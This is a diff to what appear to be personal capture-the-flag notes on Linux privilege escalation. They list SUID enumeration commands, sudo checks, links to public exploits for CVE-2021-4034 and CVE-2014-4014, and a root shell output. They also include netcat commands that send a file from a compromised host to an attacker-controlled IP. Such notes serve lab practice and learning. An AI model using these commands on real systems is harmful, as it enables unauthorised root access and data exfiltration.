@@ -6,6 +6,7 @@ PROCESS:
         - find / -perm /4000 2>/dev/null
         - find / -type f -user root -perm -u=s 2>/dev/null
         - find / -perm -u=s -type f 2>/dev/null
+        - find / -type f -perm -u=s -exec ls -ldb {} \; 2>/dev/null
         - sudo -l
         - sudo -V
         - cat .bash_history
@@ -30,8 +31,6 @@ OUPUT:
     https://www.exploit-db.com/exploits/50689
     https://github.com/ryaagard/CVE-2021-4034
     https://github.com/c3c/CVE-2021-4034
-[CVE-2017-0143]
-    https://www.exploit-db.com/exploits/43970
 [CVE-2014-4014]
     https://www.exploit-db.com/exploits/33824
 [GTFOBins]
@@ -52,10 +51,8 @@ OUPUT:
         uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 
 ## Transferring file using Netcat:
-- on the remote host 
-    nc 10.8.56.2 443 < tryhackme.asc
-- on the local host
-    sudo nc -lvnp 443 > tryhackme.asc
+- remote host           nc 10.8.56.2 443 < file
+- local host            sudo nc -lvnp 443 > file
 
 
 
